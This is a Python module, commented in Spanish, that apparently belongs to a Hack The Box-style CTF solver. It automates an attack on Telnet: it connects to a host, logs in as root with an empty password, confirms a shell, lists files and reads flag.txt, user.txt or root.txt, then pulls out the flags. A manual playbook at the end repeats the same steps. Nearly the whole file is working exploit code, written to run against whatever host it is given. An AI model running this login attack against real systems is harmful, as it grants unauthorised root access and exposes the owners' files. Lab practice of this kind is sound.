"""Explotación Telnet — root con contraseña vacía."""

from __future__ import annotations

import re
import socket
import time
from typing import Any, Optional

FLAG_FILENAMES = ("flag.txt", "user.txt", "root.txt")
TELNET_USER = "root"
ANSI_ESCAPE = re.compile(r"\x1B\[[0-9;]*[a-zA-Z]")
FLAG_PATTERN = re.compile(r"(HTB\{[^}]+\}|[a-f0-9]{32})", re.I)


def _append_step(steps: list[dict], action: str, detail: str, status: str = "ok") -> None:
    steps.append({"action": action, "detail": detail, "status": status})


def _strip_ansi(text: str) -> str:
    return ANSI_ESCAPE.sub("", text)


def _strip_iac(data: bytes) -> bytes:
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 255 and i + 2 < len(data):
            i += 3
            continue
        out.append(data[i])
        i += 1
    return bytes(out)


def _respond_iac(sock: socket.socket, data: bytes) -> None:
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] != 255:
            i += 1
            continue
        if i + 2 >= len(data):
            break
        cmd, opt = data[i + 1], data[i + 2]
        if cmd in (251, 252):
            out.extend(bytes([255, 254, opt]))
        elif cmd == 253:
            out.extend(bytes([255, 252, opt]))
        i += 3
    if out:
        sock.sendall(bytes(out))


def _decode_telnet(data: bytes) -> str:
    return _strip_ansi(_strip_iac(data).decode("utf-8", errors="replace"))


def _read_until(
    sock: socket.socket,
    markers: tuple[str, ...],
    timeout: float = 8.0,
) -> str:
    deadline = time.time() + timeout
    buffer = b""
    markers_lower = tuple(m.lower() for m in markers)

    while time.time() < deadline:
        try:
            sock.settimeout(0.4)
            chunk = sock.recv(4096)
        except (TimeoutError, OSError):
            chunk = b""
        if chunk:
            buffer += chunk
            _respond_iac(sock, chunk)
            text = _decode_telnet(buffer).lower()
            if any(m in text for m in markers_lower):
                break

    return _decode_telnet(buffer)


def _looks_like_shell(text: str) -> bool:
    clean = _strip_ansi(text)
    lower = clean.lower()
    if "assword:" in lower or "login:" in lower:
        return False
    if re.search(r"[@#]\s*$", clean, re.MULTILINE):
        return True
    if re.search(r"root@[\w.-]+", clean, re.I):
        return True
    return "#" in clean and "login" not in lower


def _extract_flags(text: str) -> list[dict]:
    clean = _strip_ansi(text)
    flags: list[dict] = []
    for match in FLAG_PATTERN.findall(clean):
        flags.append({"filename": "flag.txt", "content": match})
    if not flags:
        for line in clean.splitlines():
            line = line.strip()
            if line and len(line) < 120 and " " not in line and "cat" not in line.lower():
                if FLAG_PATTERN.fullmatch(line) or line.startswith("HTB{"):
                    flags.append({"filename": "flag.txt", "content": line})
    return flags


def _send_line(sock: socket.socket, line: str) -> None:
    sock.sendall((line + "\r\n").encode())


def _run_command(sock: socket.socket, cmd: str, wait: float = 0.6) -> str:
    _send_line(sock, cmd)
    time.sleep(wait)
    return _read_until(sock, ("#", "$", "root@", "flag", "HTB{"), timeout=3.0)


def probe_telnet_root_blank(
    host: str,
    port: int = 23,
    timeout: int = 25,
) -> dict[str, Any]:
    steps: list[dict] = []
    result: dict[str, Any] = {
        "module": "telnet_root_blank",
        "host": host,
        "port": port,
        "success": False,
        "login_user": None,
        "steps": steps,
        "files": [],
        "flags": [],
        "error": None,
    }

    sock: Optional[socket.socket] = None
    try:
        _append_step(steps, "connect", f"Telnet {host}:{port}")
        sock = socket.create_connection((host, port), timeout=timeout)

        banner = _read_until(sock, ("login", "ogin", "username"), timeout=8.0)
        _append_step(steps, "banner", (banner[:250] or "(sin banner)").replace("\r", ""))

        _append_step(steps, "login_try", f"Usuario: {TELNET_USER} (contraseña vacía)")
        _send_line(sock, TELNET_USER)
        resp = _read_until(sock, ("assword", "password", "#", "$", "root@"), timeout=6.0)

        if "assword" in resp.lower():
            _send_line(sock, "")
            resp = _read_until(sock, ("#", "$", "root@", "Welcome", "HTB{"), timeout=6.0)

        if not _looks_like_shell(resp):
            result["error"] = "No se obtuvo shell tras login Telnet"
            _append_step(steps, "error", result["error"], status="error")
            return result

        result["login_user"] = TELNET_USER
        _append_step(steps, "login_ok", f"Sesión abierta como {TELNET_USER}")

        ls_out = _run_command(sock, "ls")
        tokens = re.findall(r"[\w.\-]+", ls_out)
        result["files"] = [t for t in tokens if t in FLAG_FILENAMES or "." in t][:20]
        _append_step(steps, "list", f"ls → {', '.join(result['files'][:15]) or ls_out[:120].strip()}")

        for fname in FLAG_FILENAMES:
            content = _run_command(sock, f"cat {fname}")
            _append_step(steps, "read", f"cat {fname}")
            found = _extract_flags(content)
            if found:
                result["flags"] = found
                result["success"] = True
                break
            plain = _strip_ansi(content).strip()
            if plain and len(plain) < 200 and "not found" not in plain.lower():
                result["flags"].append({"filename": fname, "content": plain.splitlines()[-1].strip()})
                result["success"] = True
                break

    except (TimeoutError, OSError) as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", str(exc), status="error")
    except Exception as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", str(exc), status="error")
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    return result


def manual_telnet_playbook(host: str) -> list[str]:
    return [
        f"telnet {host} 23",
        "Usuario: root",
        "Contraseña: (Enter vacío)",
        "ls",
        "cat flag.txt",
    ]
